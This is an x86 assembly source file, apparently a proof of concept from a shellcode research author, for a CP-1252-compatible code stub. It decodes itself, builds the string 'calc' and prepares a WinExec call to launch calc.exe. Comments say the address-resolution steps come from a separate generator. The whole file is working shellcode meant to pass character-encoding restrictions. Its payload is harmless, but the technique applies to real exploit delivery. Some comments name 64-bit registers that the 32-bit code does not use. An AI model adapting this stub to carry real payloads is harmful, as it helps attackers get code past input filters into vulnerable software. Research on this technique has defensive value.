    
    ;
    ; CP-1252 compatible code stub for executing calc.exe
    ; odzhan, july 2020
    ;
    bits 32
    
    dec dword[eax]
    
    ; 1. Initialize rbp
    mov    al, 0
    enter  256, 0
    
    ; 2. Store rbp
    push   ebp
    add    [ebp], al
    
    ; 3. Create local variable for rbp
    push   0
    push   esp
    add    [ebp], al
    pop    ebp
    add    [ebp], cl
    
    ; 4. Store lpch pointer
    push   ecx
    add    [ebp], cl
    
    ; 5. Load lpch pointer into rsi
    pop    esi
    add    [ebp], cl
    
    ; 6. Load address of where to store decoder
    lodsd
    add    [ebp], cl
    
    ; 7. Store address on stack 
    push   eax
    add    [ebp], cl
    
    ; 8. Store address on stack
    push   eax
    add    [ebp], cl
    
    ; 9. Load address into rdi
    pop    edi
    add    [ebp], cl
    
    ; 10. Read and store byte
    movsb
    add    [ebp], cl
    
    ; 11. Skip byte
    lodsb
    add    [ebp], cl
    
    ; ****************************************
    ; repeat steps 10-11 until bytes processed
    ; ****************************************
    
    ; execute decoder
    ret
    
    ; step 1.
    ; subtract 8 from RSP to align
    ; initialize RBP for writing
    push   0
    enter  256, 0
    
    ; step 2.
    ; write \x63 \x61 \x6c \x63 \x00 or "calc\0" to local buffer

    push   0
    push   esp
    add    [ebp], cl  
    pop    edi
    add    [ebp], cl
    push   edi
    add    [ebp], cl
    pop    ecx
    add    [ebp], cl
    
    ; store 'c'
    mov    eax, 0xFF006300
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'a'
    mov    eax, 0xFF006100
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'l'
    mov    eax, 0xFF006c00
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl

    ; store 'c'
    mov    eax, 0xFF006300
    add    byte[edi], ah
    add    [ebp], cl
    scasb
    add    [ebp], cl
    
    ; store '\0'
    stosb
    add    [ebp], cl
    
    ; step 3.
    ; set rdx = SW_SHOW (5)
    push   0
    push   esp
    add    [ebp], cl
    pop    eax
    add    [ebp], cl
    mov    byte[eax], 5
    add    [ebp], cl
    pop    edx
    add    [ebp], cl
    
    ; the rest of code is added by cp1252_generate()
    
    ; step 4.
    ; store address of ntdll!RtlExitUserThread on stack
    
    ; step 5.
    ; store address of kernel32!WinExec
    
    ; step 6.
    ; invoke WinExec("calc", SW_SHOW), then RtlExitUserThread(rcx)
    
    
    